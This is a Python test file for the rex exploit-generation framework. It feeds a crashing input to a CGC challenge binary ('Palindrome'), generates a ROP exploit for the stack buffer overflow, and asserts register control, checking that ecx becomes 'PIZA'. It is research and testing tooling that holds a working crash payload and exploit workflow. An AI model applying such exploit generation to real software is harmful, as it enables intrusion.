import rex
import nose
import tracer

import os
bin_location = str(os.path.join(os.path.dirname(os.path.realpath(__file__)), '../../binaries'))

def test_cgc_type1_rop_stacksmash():
    '''
    Test creation of type1 exploit on 0b32aa01_01 ('Palindrome') with rop. The vulnerability exposed by the string `crash` is
    stack buffer overflow. This testcase should exercise rex exploiting stack-based buffer overflows with rop.
    '''

    crash = "0500ffff80ffffff80f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1ffff80f1f1f1ebf1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f100de7fff80ffffff800fffffff7ef3ffffffff7fffff80fffffeff09fefefefefe0a57656c63fe6d6520746f2850616c696e64726f6d65204669776465720a0affffffff80ffffe8800fffffff7f230a"

    crash = rex.Crash(os.path.join(bin_location, "cgc_scored_event_1/cgc/0b32aa01_01"), crash.decode('hex'))
    exploit = crash.exploit()

    exploit_master = exploit.arsenal['rop_set_register']

    # make sure we can control ecx, edx, ebx, ebp, esi, and edi with rop
    nose.tools.assert_true(exploit_master.can_control('ecx'))
    nose.tools.assert_true(exploit_master.can_control('edx'))
    nose.tools.assert_true(exploit_master.can_control('ebx'))
    nose.tools.assert_true(exploit_master.can_control('ebp'))
    nose.tools.assert_true(exploit_master.can_control('esi'))
    nose.tools.assert_true(exploit_master.can_control('edi'))

    # make sure our ecx chain actually works (ecx is chosen arbitrarily)
    ecx_exploit = exploit_master.register_mapping['ecx']

    c_str = ecx_exploit._chain.payload_str(constraints=(ecx_exploit._value_var==0x50495a41))
    c_bvv = ecx_exploit.crash.state.se.BVV(c_str)

    c_mem = ecx_exploit.crash.state.memory.load(ecx_exploit._chain_addr, len(c_str))
    ecx_exploit.crash.state.add_constraints(c_mem == c_bvv)

    exploited_state = ecx_exploit._windup_state(ecx_exploit.crash.state)

    # make sure there is only one possibility for ecx at this point
    exploited_ecx_vals = exploited_state.se.any_n_str(exploited_state.regs.ecx, 2)
    nose.tools.assert_true(len(exploited_ecx_vals) == 1)

    ecx_val = exploited_ecx_vals[0]
    nose.tools.assert_equal(ecx_val, "PIZA")

def run_all():
    functions = globals()
    all_functions = dict(filter((lambda (k, v): k.startswith('test_')), functions.items()))
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()